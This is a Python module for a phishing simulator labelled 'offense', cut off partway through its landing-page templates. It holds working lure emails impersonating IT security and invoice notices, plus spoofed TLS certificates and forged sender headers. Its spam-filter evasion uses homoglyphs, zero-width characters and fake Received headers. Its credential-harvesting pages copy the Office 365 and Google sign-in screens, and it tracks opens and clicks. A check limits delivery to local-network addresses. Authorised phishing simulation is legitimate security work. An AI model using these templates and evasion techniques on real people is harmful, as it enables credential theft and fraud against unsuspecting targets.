"""Gone Fishing Mail Service — Local network phishing simulator.

Combines features from GoPhish, King Phisher, SET, and Swaks:
sender spoofing, self-signed TLS certs, HTML templates, tracking pixels,
campaign management, attachment support.

Hard-wired to reject delivery to non-RFC1918 addresses.
"""

DESCRIPTION = "Gone Fishing Mail Service — local network phishing simulator"
AUTHOR = "darkHal"
VERSION = "1.0"
CATEGORY = "offense"

import os
import json
import time
import uuid
import socket
import smtplib
import threading
import subprocess
import ipaddress
from pathlib import Path
from datetime import datetime
from email import encoders
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from typing import Dict, List, Optional, Any

try:
    from core.paths import get_data_dir
except ImportError:
    def get_data_dir():
        return str(Path(__file__).parent.parent / 'data')


# ── RFC1918 networks for local-only enforcement ─────────────────────────────
_LOCAL_NETS = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('::1/128'),
    ipaddress.ip_network('fe80::/10'),
]


def _is_local_ip(ip_str: str) -> bool:
    """Check if an IP address is in RFC1918/loopback range."""
    try:
        addr = ipaddress.ip_address(ip_str)
        return any(addr in net for net in _LOCAL_NETS)
    except ValueError:
        return False


def _validate_local_only(address: str) -> tuple:
    """Validate that a recipient's mail server resolves to a local IP.

    Returns (ok: bool, message: str).
    """
    # Extract domain from email
    if '@' not in address:
        # Treat as hostname/IP directly
        domain = address
    else:
        domain = address.split('@')[1]

    # Direct IP check
    try:
        addr = ipaddress.ip_address(domain)
        if _is_local_ip(str(addr)):
            return True, f"Direct IP {domain} is local"
        return False, f"BLOCKED: {domain} is not a local network address"
    except ValueError:
        pass

    # DNS resolution
    try:
        results = socket.getaddrinfo(domain, 25, socket.AF_UNSPEC, socket.SOCK_STREAM)
        for family, stype, proto, canonname, sockaddr in results:
            ip = sockaddr[0]
            if _is_local_ip(ip):
                return True, f"{domain} resolves to local IP {ip}"
        # Try MX records via simple DNS
        ips_found = [sockaddr[0] for _, _, _, _, sockaddr in results]
        return False, f"BLOCKED: {domain} resolves to external IPs: {', '.join(ips_found)}"
    except socket.gaierror:
        return False, f"BLOCKED: Cannot resolve {domain}"


# ── Template Manager ─────────────────────────────────────────────────────────

_BUILTIN_TEMPLATES = {
    "Password Reset": {
        "subject": "Action Required: Password Reset",
        "html": """<div style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:20px">
<div style="background:#1a73e8;color:#fff;padding:15px 20px;border-radius:8px 8px 0 0">
<h2 style="margin:0">Security Alert</h2></div>
<div style="background:#f8f9fa;padding:20px;border:1px solid #ddd;border-top:none;border-radius:0 0 8px 8px">
<p>Dear {{name}},</p>
<p>We detected unusual activity on your account (<strong>{{email}}</strong>). For your security, please reset your password immediately.</p>
<p style="text-align:center;margin:25px 0"><a href="{{link}}" style="background:#1a73e8;color:#fff;padding:12px 30px;border-radius:4px;text-decoration:none;font-weight:bold">Reset Password Now</a></p>
<p style="color:#666;font-size:0.85em">If you did not request this, please ignore this email. This link expires in 24 hours.</p>
<p>— IT Security Team</p>
</div>{{tracking_pixel}}</div>""",
        "text": "Dear {{name}},\n\nWe detected unusual activity on your account ({{email}}). Please reset your password: {{link}}\n\n— IT Security Team",
    },
    "Invoice Attached": {
        "subject": "Invoice #{{invoice_num}} — Payment Due",
        "html": """<div style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:20px">
<div style="background:#2d2d2d;color:#fff;padding:15px 20px;border-radius:8px 8px 0 0">
<h2 style="margin:0">Invoice Notification</h2></div>
<div style="background:#fff;padding:20px;border:1px solid #ddd;border-top:none;border-radius:0 0 8px 8px">
<p>Hi {{name}},</p>
<p>Please find attached invoice <strong>#{{invoice_num}}</strong> for the amount of <strong>{{amount}}</strong>.</p>
<p>Payment is due by <strong>{{date}}</strong>. Please review the attached document and process the payment at your earliest convenience.</p>
<p>If you have any questions, reply to this email.</p>
<p>Best regards,<br>Accounts Department<br>{{company}}</p>
</div>{{tracking_pixel}}</div>""",
        "text": "Hi {{name}},\n\nPlease find attached invoice #{{invoice_num}} for {{amount}}.\nPayment due: {{date}}\n\nBest regards,\nAccounts Department\n{{company}}",
    },
    "Shared Document": {
        "subject": "{{sender_name}} shared a document with you",
        "html": """<div style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:20px">
<div style="text-align:center;padding:20px">
<div style="width:60px;height:60px;background:#4285f4;border-radius:12px;display:inline-flex;align-items:center;justify-content:center;color:#fff;font-size:28px;margin-bottom:15px">&#x1F4C4;</div>
<h2 style="color:#333;margin:0">{{sender_name}} shared a file with you</h2>
</div>
<div style="background:#f8f9fa;padding:20px;border-radius:8px;text-align:center">
<p style="color:#666">{{sender_name}} ({{sender_email}}) has shared the following document:</p>
<p style="font-size:1.1em;font-weight:bold;color:#333">{{document_name}}</p>
<p style="text-align:center;margin:20px 0"><a href="{{link}}" style="background:#4285f4;color:#fff;padding:12px 30px;border-radius:4px;text-decoration:none;font-weight:bold">Open Document</a></p>
<p style="color:#999;font-size:0.8em">This sharing link will expire on {{date}}</p>
</div>{{tracking_pixel}}</div>""",
        "text": "{{sender_name}} shared a document with you.\n\nDocument: {{document_name}}\nOpen: {{link}}\n\nExpires: {{date}}",
    },
    "Security Alert": {
        "subject": "Urgent: Suspicious Login Detected",
        "html": """<div style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:20px">
<div style="background:#d93025;color:#fff;padding:15px 20px;border-radius:8px 8px 0 0">
<h2 style="margin:0">&#x26A0; Security Alert</h2></div>
<div style="background:#fff;padding:20px;border:1px solid #ddd;border-top:none;border-radius:0 0 8px 8px">
<p>Dear {{name}},</p>
<p>We detected a login to your account from an unrecognized device:</p>
<table style="width:100%;margin:15px 0;border-collapse:collapse">
<tr><td style="padding:8px;border-bottom:1px solid #eee;color:#666">Location:</td><td style="padding:8px;border-bottom:1px solid #eee;font-weight:bold">{{location}}</td></tr>
<tr><td style="padding:8px;border-bottom:1px solid #eee;color:#666">Device:</td><td style="padding:8px;border-bottom:1px solid #eee;font-weight:bold">{{device}}</td></tr>
<tr><td style="padding:8px;border-bottom:1px solid #eee;color:#666">Time:</td><td style="padding:8px;border-bottom:1px solid #eee;font-weight:bold">{{date}}</td></tr>
<tr><td style="padding:8px;color:#666">IP Address:</td><td style="padding:8px;font-weight:bold">{{ip_address}}</td></tr>
</table>
<p>If this was you, no action is needed. Otherwise, <a href="{{link}}" style="color:#d93025;font-weight:bold">secure your account immediately</a>.</p>
</div>{{tracking_pixel}}</div>""",
        "text": "Security Alert\n\nDear {{name}},\n\nUnrecognized login detected:\nLocation: {{location}}\nDevice: {{device}}\nTime: {{date}}\nIP: {{ip_address}}\n\nSecure your account: {{link}}",
    },
    "Meeting Update": {
        "subject": "Meeting Update: {{meeting_title}}",
        "html": """<div style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:20px">
<div style="background:#0b8043;color:#fff;padding:15px 20px;border-radius:8px 8px 0 0">
<h2 style="margin:0">&#x1F4C5; Calendar Update</h2></div>
<div style="background:#fff;padding:20px;border:1px solid #ddd;border-top:none;border-radius:0 0 8px 8px">
<p>Hi {{name}},</p>
<p>The following meeting has been updated:</p>
<div style="background:#e8f5e9;padding:15px;border-radius:6px;margin:15px 0">
<strong>{{meeting_title}}</strong><br>
<span style="color:#666">{{date}} at {{time}}</span><br>
<span style="color:#666">Organizer: {{organizer}}</span>
</div>
<p>Please review the updated agenda and confirm your attendance.</p>
<p style="text-align:center;margin:20px 0"><a href="{{link}}" style="background:#0b8043;color:#fff;padding:12px 30px;border-radius:4px;text-decoration:none;font-weight:bold">View Meeting Details</a></p>
</div>{{tracking_pixel}}</div>""",
        "text": "Meeting Update: {{meeting_title}}\n\nHi {{name}},\n\n{{meeting_title}} has been updated.\nDate: {{date}} at {{time}}\nOrganizer: {{organizer}}\n\nView details: {{link}}",
    },
}


class TemplateManager:
    """Manage email templates (built-in + custom)."""

    def __init__(self):
        self._file = os.path.join(get_data_dir(), 'phishmail_templates.json')
        self._custom = {}
        self._load()

    def _load(self):
        if os.path.exists(self._file):
            try:
                with open(self._file, 'r') as f:
                    self._custom = json.load(f)
            except Exception:
                self._custom = {}

    def _save(self):
        os.makedirs(os.path.dirname(self._file), exist_ok=True)
        with open(self._file, 'w') as f:
            json.dump(self._custom, f, indent=2)

    def list_templates(self) -> Dict[str, dict]:
        merged = {}
        for name, tpl in _BUILTIN_TEMPLATES.items():
            merged[name] = {**tpl, 'builtin': True}
        for name, tpl in self._custom.items():
            merged[name] = {**tpl, 'builtin': False}
        return merged

    def get_template(self, name: str) -> Optional[dict]:
        if name in self._custom:
            return {**self._custom[name], 'builtin': False}
        if name in _BUILTIN_TEMPLATES:
            return {**_BUILTIN_TEMPLATES[name], 'builtin': True}
        return None

    def save_template(self, name: str, html: str, text: str = '', subject: str = ''):
        self._custom[name] = {'html': html, 'text': text, 'subject': subject}
        self._save()

    def delete_template(self, name: str) -> bool:
        if name in self._custom:
            del self._custom[name]
            self._save()
            return True
        return False


# ── Campaign Manager ─────────────────────────────────────────────────────────

class CampaignManager:
    """Manage phishing campaigns with tracking."""

    def __init__(self):
        self._file = os.path.join(get_data_dir(), 'phishmail_campaigns.json')
        self._campaigns = {}
        self._load()

    def _load(self):
        if os.path.exists(self._file):
            try:
                with open(self._file, 'r') as f:
                    self._campaigns = json.load(f)
            except Exception:
                self._campaigns = {}

    def _save(self):
        os.makedirs(os.path.dirname(self._file), exist_ok=True)
        with open(self._file, 'w') as f:
            json.dump(self._campaigns, f, indent=2)

    def create_campaign(self, name: str, template: str, targets: List[str],
                        from_addr: str, from_name: str, subject: str,
                        smtp_host: str = '127.0.0.1', smtp_port: int = 25) -> str:
        cid = uuid.uuid4().hex[:12]
        self._campaigns[cid] = {
            'id': cid,
            'name': name,
            'template': template,
            'targets': [
                {'email': t.strip(), 'id': uuid.uuid4().hex[:8],
                 'status': 'pending', 'sent_at': None, 'opened_at': None,
                 'clicked_at': None}
                for t in targets if t.strip()
            ],
            'from_addr': from_addr,
            'from_name': from_name,
            'subject': subject,
            'smtp_host': smtp_host,
            'smtp_port': smtp_port,
            'created': datetime.now().isoformat(),
            'status': 'draft',
        }
        self._save()
        return cid

    def get_campaign(self, cid: str) -> Optional[dict]:
        return self._campaigns.get(cid)

    def list_campaigns(self) -> List[dict]:
        return list(self._campaigns.values())

    def delete_campaign(self, cid: str) -> bool:
        if cid in self._campaigns:
            del self._campaigns[cid]
            self._save()
            return True
        return False

    def update_target_status(self, cid: str, target_id: str,
                             field: str, value: str):
        camp = self._campaigns.get(cid)
        if not camp:
            return
        for t in camp['targets']:
            if t['id'] == target_id:
                t[field] = value
                break
        self._save()

    def record_open(self, cid: str, target_id: str):
        self.update_target_status(cid, target_id, 'opened_at',
                                  datetime.now().isoformat())

    def record_click(self, cid: str, target_id: str):
        self.update_target_status(cid, target_id, 'clicked_at',
                                  datetime.now().isoformat())

    def get_stats(self, cid: str) -> dict:
        camp = self._campaigns.get(cid)
        if not camp:
            return {}
        targets = camp.get('targets', [])
        total = len(targets)
        sent = sum(1 for t in targets if t.get('sent_at'))
        opened = sum(1 for t in targets if t.get('opened_at'))
        clicked = sum(1 for t in targets if t.get('clicked_at'))
        return {
            'total': total, 'sent': sent, 'opened': opened,
            'clicked': clicked,
            'open_rate': f"{opened/sent*100:.1f}%" if sent else '0%',
            'click_rate': f"{clicked/sent*100:.1f}%" if sent else '0%',
        }


# ── SMTP Relay Server ────────────────────────────────────────────────────────

class _SMTPHandler:
    """Simple SMTP receiver using raw sockets (no aiosmtpd dependency)."""

    def __init__(self, host='0.0.0.0', port=2525):
        self.host = host
        self.port = port
        self._sock = None
        self._running = False
        self._thread = None
        self._received = []

    def start(self):
        if self._running:
            return
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.settimeout(2)
        self._sock.bind((self.host, self.port))
        self._sock.listen(5)
        self._running = True
        self._thread = threading.Thread(target=self._accept_loop, daemon=True)
        self._thread.start()

    def stop(self):
        self._running = False
        if self._sock:
            try:
                self._sock.close()
            except Exception:
                pass
        if self._thread:
            self._thread.join(timeout=5)

    def _accept_loop(self):
        while self._running:
            try:
                conn, addr = self._sock.accept()
                threading.Thread(target=self._handle_client,
                                 args=(conn, addr), daemon=True).start()
            except socket.timeout:
                continue
            except Exception:
                if self._running:
                    continue
                break

    def _handle_client(self, conn, addr):
        """Minimal SMTP conversation handler."""
        try:
            conn.settimeout(30)
            conn.sendall(b'220 Gone Fishing SMTP Ready\r\n')
            mail_from = ''
            rcpt_to = []
            data_buf = b''
            while True:
                line = b''
                while not line.endswith(b'\r\n'):
                    chunk = conn.recv(1)
                    if not chunk:
                        return
                    line += chunk
                cmd = line.decode('utf-8', errors='replace').strip().upper()

                if cmd.startswith('EHLO') or cmd.startswith('HELO'):
                    conn.sendall(b'250-Gone Fishing\r\n250 OK\r\n')
                elif cmd.startswith('MAIL FROM'):
                    mail_from = line.decode('utf-8', errors='replace').split(':', 1)[1].strip().strip('<>')
                    conn.sendall(b'250 OK\r\n')
                elif cmd.startswith('RCPT TO'):
                    rcpt = line.decode('utf-8', errors='replace').split(':', 1)[1].strip().strip('<>')
                    rcpt_to.append(rcpt)
                    conn.sendall(b'250 OK\r\n')
                elif cmd == 'DATA':
                    conn.sendall(b'354 End data with <CR><LF>.<CR><LF>\r\n')
                    data_buf = b''
                    while True:
                        chunk = conn.recv(4096)
                        if not chunk:
                            break
                        data_buf += chunk
                        if data_buf.endswith(b'\r\n.\r\n'):
                            break
                    self._received.append({
                        'from': mail_from,
                        'to': rcpt_to,
                        'data': data_buf.decode('utf-8', errors='replace'),
                        'time': datetime.now().isoformat(),
                        'addr': addr,
                    })
                    conn.sendall(b'250 OK\r\n')
                elif cmd == 'QUIT':
                    conn.sendall(b'221 Bye\r\n')
                    break
                elif cmd.startswith('STARTTLS'):
                    conn.sendall(b'454 TLS not available on relay\r\n')
                else:
                    conn.sendall(b'500 Unknown command\r\n')
        except Exception:
            pass
        finally:
            try:
                conn.close()
            except Exception:
                pass

    @property
    def received_count(self):
        return len(self._received)


# ── Gone Fishing Server ─────────────────────────────────────────────────────

class GoneFishingServer:
    """Main phishing mail service combining SMTP relay, sender, and tracking."""

    def __init__(self):
        self.templates = TemplateManager()
        self.campaigns = CampaignManager()
        self.landing_pages = LandingPageManager()
        self.evasion = EmailEvasion()
        self.dkim = DKIMHelper()
        self._relay = None
        self._tracking_events = []

    @property
    def relay_running(self) -> bool:
        return self._relay is not None and self._relay._running

    def start_relay(self, host: str = '0.0.0.0', port: int = 2525):
        if self._relay and self._relay._running:
            return {'ok': True, 'message': 'Relay already running'}
        self._relay = _SMTPHandler(host, port)
        self._relay.start()
        return {'ok': True, 'message': f'SMTP relay started on {host}:{port}'}

    def stop_relay(self):
        if self._relay:
            self._relay.stop()
            self._relay = None
        return {'ok': True, 'message': 'Relay stopped'}

    def relay_status(self) -> dict:
        if self._relay and self._relay._running:
            return {
                'running': True,
                'host': self._relay.host,
                'port': self._relay.port,
                'received': self._relay.received_count,
            }
        return {'running': False}

    def generate_cert(self, cn: str = 'mail.example.com',
                      org: str = 'Example Inc',
                      ou: str = '', locality: str = '',
                      state: str = '', country: str = 'US',
                      days: int = 365) -> dict:
        """Generate a spoofed self-signed TLS certificate."""
        cert_dir = os.path.join(get_data_dir(), 'certs', 'phishmail')
        os.makedirs(cert_dir, exist_ok=True)

        safe_cn = cn.replace('/', '_').replace('\\', '_').replace(' ', '_')
        cert_path = os.path.join(cert_dir, f'{safe_cn}.crt')
        key_path = os.path.join(cert_dir, f'{safe_cn}.key')

        subj_parts = [f'/CN={cn}']
        if org:
            subj_parts.append(f'/O={org}')
        if ou:
            subj_parts.append(f'/OU={ou}')
        if locality:
            subj_parts.append(f'/L={locality}')
        if state:
            subj_parts.append(f'/ST={state}')
        if country:
            subj_parts.append(f'/C={country}')
        subj = ''.join(subj_parts)

        try:
            subprocess.run([
                'openssl', 'req', '-x509', '-newkey', 'rsa:2048',
                '-keyout', key_path, '-out', cert_path,
                '-days', str(days), '-nodes',
                '-subj', subj,
            ], check=True, capture_output=True)
            return {
                'ok': True, 'cert': cert_path, 'key': key_path,
                'cn': cn, 'org': org,
                'message': f'Certificate generated: {safe_cn}.crt',
            }
        except FileNotFoundError:
            return {'ok': False, 'error': 'OpenSSL not found — install OpenSSL to generate certificates'}
        except subprocess.CalledProcessError as e:
            return {'ok': False, 'error': f'OpenSSL error: {e.stderr.decode(errors="replace")}'}

    def list_certs(self) -> List[dict]:
        cert_dir = os.path.join(get_data_dir(), 'certs', 'phishmail')
        if not os.path.isdir(cert_dir):
            return []
        certs = []
        for f in os.listdir(cert_dir):
            if f.endswith('.crt'):
                name = f[:-4]
                key_exists = os.path.exists(os.path.join(cert_dir, f'{name}.key'))
                certs.append({'name': name, 'cert': f, 'has_key': key_exists})
        return certs

    def _build_message(self, config: dict) -> MIMEMultipart:
        """Build a MIME email message from config."""
        msg = MIMEMultipart('alternative')
        msg['From'] = f"{config.get('from_name', '')} <{config['from_addr']}>"
        msg['To'] = ', '.join(config.get('to_addrs', []))
        msg['Subject'] = config.get('subject', '')
        msg['Reply-To'] = config.get('reply_to', config['from_addr'])
        msg['X-Mailer'] = config.get('x_mailer', 'Microsoft Outlook 16.0')
        msg['Message-ID'] = f"<{uuid.uuid4().hex}@{config['from_addr'].split('@')[-1]}>"
        msg['Date'] = datetime.now().strftime('%a, %d %b %Y %H:%M:%S %z') or \
                      datetime.now().strftime('%a, %d %b %Y %H:%M:%S +0000')

        # Evasion: additional headers
        if config.get('x_priority'):
            msg['X-Priority'] = config['x_priority']
        if config.get('x_originating_ip'):
            msg['X-Originating-IP'] = f"[{config['x_originating_ip']}]"
        if config.get('return_path'):
            msg['Return-Path'] = config['return_path']
        if config.get('list_unsubscribe'):
            msg['List-Unsubscribe'] = config['list_unsubscribe']

        # Evasion: spoofed Received headers
        for received in config.get('received_headers', []):
            msg['Received'] = received

        # Custom headers
        for hdr_name, hdr_val in config.get('custom_headers', {}).items():
            msg[hdr_name] = hdr_val

        # Text part
        text_body = config.get('text_body', '')
        if text_body:
            msg.attach(MIMEText(text_body, 'plain'))

        # HTML part
        html_body = config.get('html_body', '')
        if html_body:
            # Apply evasion if requested
            evasion_mode = config.get('evasion_mode', '')
            if evasion_mode == 'homoglyph':
                html_body = self.evasion.homoglyph_text(html_body)
            elif evasion_mode == 'zero_width':
                html_body = self.evasion.zero_width_insert(html_body)
            elif evasion_mode == 'html_entity':
                html_body = self.evasion.html_entity_encode(html_body)
            msg.attach(MIMEText(html_body, 'html'))

        # Attachments
        for filepath in config.get('attachments', []):
            if os.path.isfile(filepath):
                part = MIMEBase('application', 'octet-stream')
                with open(filepath, 'rb') as f:
                    part.set_payload(f.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', 'attachment',
                                filename=os.path.basename(filepath))
                msg.attach(part)

        return msg

    def _inject_tracking(self, html: str, campaign_id: str,
                         target_id: str, base_url: str = '') -> str:
        """Inject tracking pixel and rewrite links for click tracking."""
        if not base_url:
            base_url = 'http://127.0.0.1:8181'

        # Tracking pixel
        pixel_url = f"{base_url}/phishmail/track/pixel/{campaign_id}/{target_id}"
        pixel_tag = f'<img src="{pixel_url}" width="1" height="1" style="display:none" alt="">'
        html = html.replace('{{tracking_pixel}}', pixel_tag)

        # Link rewriting — replace href values with tracking redirects
        import re
        link_counter = [0]

        def _rewrite_link(match):
            original = match.group(1)
            if 'track/pixel' in original or 'track/click' in original:
                return match.group(0)
            link_id = link_counter[0]
            link_counter[0] += 1
            import base64
            encoded = base64.urlsafe_b64encode(original.encode()).decode()
            track_url = f"{base_url}/phishmail/track/click/{campaign_id}/{target_id}/{encoded}"
            return f'href="{track_url}"'

        html = re.sub(r'href="([^"]+)"', _rewrite_link, html)
        return html

    def send_email(self, config: dict) -> dict:
        """Send a single email.

        Config keys: from_addr, from_name, to_addrs (list), subject,
        html_body, text_body, attachments (list of paths),
        smtp_host, smtp_port, use_tls, cert_cn (for TLS cert lookup).
        """
        to_addrs = config.get('to_addrs', [])
        if isinstance(to_addrs, str):
            to_addrs = [a.strip() for a in to_addrs.split(',') if a.strip()]

        # Validate all recipients are local
        for addr in to_addrs:
            ok, msg = _validate_local_only(addr)
            if not ok:
                return {'ok': False, 'error': msg}

        smtp_host = config.get('smtp_host', '127.0.0.1')
        smtp_port = int(config.get('smtp_port', 25))
        use_tls = config.get('use_tls', False)

        config['to_addrs'] = to_addrs
        message = self._build_message(config)

        try:
            if use_tls:
                # Look for spoofed cert
                cert_cn = config.get('cert_cn', '')
                if cert_cn:
                    cert_dir = os.path.join(get_data_dir(), 'certs', 'phishmail')
                    safe_cn = cert_cn.replace('/', '_').replace('\\', '_').replace(' ', '_')
                    cert_path = os.path.join(cert_dir, f'{safe_cn}.crt')
                    key_path = os.path.join(cert_dir, f'{safe_cn}.key')
                    if os.path.exists(cert_path) and os.path.exists(key_path):
                        import ssl as _ssl
                        ctx = _ssl.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode = _ssl.CERT_NONE
                        ctx.load_cert_chain(cert_path, key_path)
                        server = smtplib.SMTP(smtp_host, smtp_port, timeout=15)
                        server.starttls(context=ctx)
                    else:
                        server = smtplib.SMTP(smtp_host, smtp_port, timeout=15)
                        server.starttls()
                else:
                    server = smtplib.SMTP(smtp_host, smtp_port, timeout=15)
                    server.starttls()
            else:
                server = smtplib.SMTP(smtp_host, smtp_port, timeout=15)

            server.sendmail(config['from_addr'], to_addrs, message.as_string())
            server.quit()
            return {'ok': True, 'message': f'Email sent to {len(to_addrs)} recipient(s)'}
        except smtplib.SMTPException as e:
            return {'ok': False, 'error': f'SMTP error: {e}'}
        except ConnectionRefusedError:
            return {'ok': False, 'error': f'Connection refused: {smtp_host}:{smtp_port}'}
        except Exception as e:
            return {'ok': False, 'error': str(e)}

    def send_campaign(self, cid: str, base_url: str = '',
                      delay: float = 1.0) -> dict:
        """Send all emails in a campaign with tracking injection."""
        camp = self.campaigns.get_campaign(cid)
        if not camp:
            return {'ok': False, 'error': 'Campaign not found'}

        tpl = self.templates.get_template(camp['template'])
        if not tpl:
            return {'ok': False, 'error': f"Template '{camp['template']}' not found"}

        # Validate all targets first
        for t in camp['targets']:
            ok, msg = _validate_local_only(t['email'])
            if not ok:
                return {'ok': False, 'error': f"Target {t['email']}: {msg}"}

        sent = 0
        errors = []
        for t in camp['targets']:
            html = tpl.get('html', '')
            text = tpl.get('text', '')
            subject = camp.get('subject', tpl.get('subject', ''))

            # Variable substitution
            vars_map = {
                '{{name}}': t['email'].split('@')[0].replace('.', ' ').title(),
                '{{email}}': t['email'],
                '{{company}}': camp.get('from_name', 'Company'),
                '{{date}}': datetime.now().strftime('%B %d, %Y'),
                '{{link}}': f'{base_url}/phishmail/track/click/{cid}/{t["id"]}/landing',
            }
            for var, val in vars_map.items():
                html = html.replace(var, val)
                text = text.replace(var, val)
                subject = subject.replace(var, val)

            # Inject tracking
            html = self._inject_tracking(html, cid, t['id'], base_url)

            config = {
                'from_addr': camp['from_addr'],
                'from_name': camp['from_name'],
                'to_addrs': [t['email']],
                'subject': subject,
                'html_body': html,
                'text_body': text,
                'smtp_host': camp.get('smtp_host', '127.0.0.1'),
                'smtp_port': camp.get('smtp_port', 25),
            }

            result = self.send_email(config)
            if result['ok']:
                self.campaigns.update_target_status(
                    cid, t['id'], 'status', 'sent')
                self.campaigns.update_target_status(
                    cid, t['id'], 'sent_at', datetime.now().isoformat())
                sent += 1
            else:
                errors.append(f"{t['email']}: {result['error']}")
                self.campaigns.update_target_status(
                    cid, t['id'], 'status', 'failed')

            if delay > 0:
                time.sleep(delay)

        # Update campaign status
        camp_data = self.campaigns.get_campaign(cid)
        if camp_data:
            camp_data['status'] = 'sent'
            self.campaigns._save()

        if errors:
            return {'ok': True, 'sent': sent, 'errors': errors,
                    'message': f'Sent {sent}/{len(camp["targets"])} emails, {len(errors)} failed'}
        return {'ok': True, 'sent': sent,
                'message': f'Campaign sent to {sent} target(s)'}

    def setup_dns_for_domain(self, domain: str, mail_host: str = '',
                              spf_allow: str = '') -> dict:
        """Auto-configure DNS records for a spoofed domain via the DNS service.

        Creates zone + MX + SPF + DMARC records if the DNS service is running.
        """
        try:
            from core.dns_service import get_dns_service
            dns = get_dns_service()
            if not dns.is_running():
                return {'ok': False, 'error': 'DNS service not running'}

            # Create zone if it doesn't exist
            dns.create_zone(domain)

            # Setup mail records
            result = dns.setup_mail_records(
                domain,
                mx_host=mail_host or f'mail.{domain}',
                spf_allow=spf_allow or 'ip4:127.0.0.1',
            )
            return result
        except ImportError:
            return {'ok': False, 'error': 'DNS service module not available'}
        except Exception as e:
            return {'ok': False, 'error': str(e)}

    def dns_status(self) -> dict:
        """Check if DNS service is available and running."""
        try:
            from core.dns_service import get_dns_service
            dns = get_dns_service()
            return {'available': True, 'running': dns.is_running()}
        except Exception:
            return {'available': False, 'running': False}

    def test_smtp(self, host: str, port: int = 25, timeout: int = 5) -> dict:
        """Test SMTP connectivity to a server."""
        try:
            server = smtplib.SMTP(host, port, timeout=timeout)
            banner = server.ehlo_resp or server.helo_resp
            server.quit()
            return {
                'ok': True,
                'message': f'Connected to {host}:{port}',
                'banner': banner.decode(errors='replace') if isinstance(banner, bytes) else str(banner),
            }
        except Exception as e:
            return {'ok': False, 'error': str(e)}


# ── Landing Page & Credential Harvesting ──────────────────────────────────────

_LANDING_TEMPLATES = {
    "Office 365 Login": {
        "html": """<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in to your account</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',sans-serif;background:#f2f2f2;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;width:440px;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,0.2)}.logo{font-size:1.4rem;font-weight:600;margin-bottom:16px}
.subtitle{font-size:0.9rem;color:#1b1b1b;margin-bottom:24px}input[type=email],input[type=password],input[type=text]{width:100%;padding:8px 10px;border:1px solid #666;margin-bottom:16px;font-size:0.95rem}
.btn{background:#0067b8;color:#fff;border:none;padding:10px 20px;font-size:0.95rem;cursor:pointer;width:100%;margin-top:8px}.btn:hover{background:#005a9e}
.link{color:#0067b8;text-decoration:none;font-size:0.82rem}.footer{margin-top:20px;font-size:0.75rem;color:#666}</style></head>
<body><div class="login-box"><div class="logo">Microsoft</div><div class="subtitle">Sign in</div>
<form method="POST"><input type="text" name="email" placeholder="Email, phone, or Skype" required value="{{email}}">
<input type="password" name="password" placeholder="Password" required>
<input type="hidden" name="_campaign" value="{{campaign_id}}"><input type="hidden" name="_target" value="{{target_id}}">
<button type="submit" class="btn">Sign in</button></form>
<div class="footer"><a href="#" class="link">Can't access your account?</a><br><br>
<a href="#" class="link">Sign in with a security key</a></div></div></body></html>""",
        "fields": ["email", "password"],
    },
    "Google Login": {
        "html": """<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in - Google Accounts</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Google Sans','Roboto',sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{border:1px solid #dadce0;border-radius:8px;width:450px;padding:48px 40px 36px}.logo{text-align:center;margin-bottom:16px;font-size:24px}
.logo span{color:#4285f4}.logo span:nth-child(2){color:#ea4335}.logo span:nth-child(3){color:#fbbc04}.logo span:nth-child(4){color:#4285f4}.logo span:nth-child(5){color:#34a853}.logo span:nth-child(6){color:#ea4335}
h1{text-align:center;font-size:24px;font-weight:400;margin-bottom:8px}p.sub{text-align:center;font-size:16px;color:#202124;margin-bottom:32px}
input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin-bottom:24px;outline:none}input:focus{border-color:#1a73e8;border-width:2px}
.btn{background:#1a73e8;color:#fff;border:none;padding:10px 24px;border-radius:4px;font-size:14px;cursor:pointer;float:right}.btn:hover{background:#1557b0;box-shadow:0 1px 3px rgba(0,0,0,0.3)}
.link{color:#1a73e8;text-decoration:none;font-size:14px}.footer{margin-top:60px;overflow:hidden}</style></head>
<body><div class="card"><div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
<h1>Sign in</h1><p class="sub">Use your Google Account</p>
<form method="POST"><input type="text" name="email" placeholder="Email or phone" required value="{{email}}">
<input type="password" name="password" placeholder="Enter your password" required>
<input type="hidden" name="_campaign" value="{{campaign_id}}"><input type="hidden" name="_target" value="{{target_id}}">
<div class="footer"><a href="#" class="link">Forgot email?</a><button type="submit" class="btn">Next</button></div></form></div></body></html>""",
        "fields": ["email", "password"],
    },
    "Generic Login": {
        "html": """<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Login Required</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:8px;width:400px;padding:40px;box-shadow:0 4px 12px rgba(0,0,0,0.1)}h2{margin-bottom:8px;color:#333}
.sub{color:#666;font-size:0.9rem;margin-bottom:24px}label{display:block;font-size:0.85rem;color:#333;margin-bottom:4px;font-weight:600}
